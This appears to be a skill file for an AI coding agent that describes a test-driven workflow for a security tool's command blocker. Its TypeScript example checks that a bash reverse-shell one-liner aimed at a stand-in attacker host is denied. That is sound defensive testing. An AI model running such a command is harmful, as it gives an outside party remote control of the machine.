---
name: tdd-workflow
description: vibesafu TDD workflow. Required for implementing security logic.
---

# TDD for Security Code

## Process

1. **RED** - Write failing test
   - Define expected input/output
   - Include edge cases (empty string, special chars, unicode)

2. **GREEN** - Pass with minimal code
   - Focus only on passing tests
   - Optimize later

3. **REFACTOR** - Clean up
   - Remove duplication
   - Verify tests still pass

## Security Test Examples

```typescript
describe('InstantBlock', () => {
  it('should block reverse shell patterns', () => {
    const input = 'bash -i >& /dev/tcp/attacker.com/4444 0>&1';
    expect(checkInstantBlock(input)).toEqual({
      behavior: 'deny',
      message: expect.stringContaining('reverse shell')
    });
  });

  it('should allow normal bash commands', () => {
    const input = 'npm install lodash';
    expect(checkInstantBlock(input)).toBeNull();
  });
});
```

## Rules

- Always write tests before adding security patterns
- False positive/negative test cases required
- Maintain 80%+ coverage
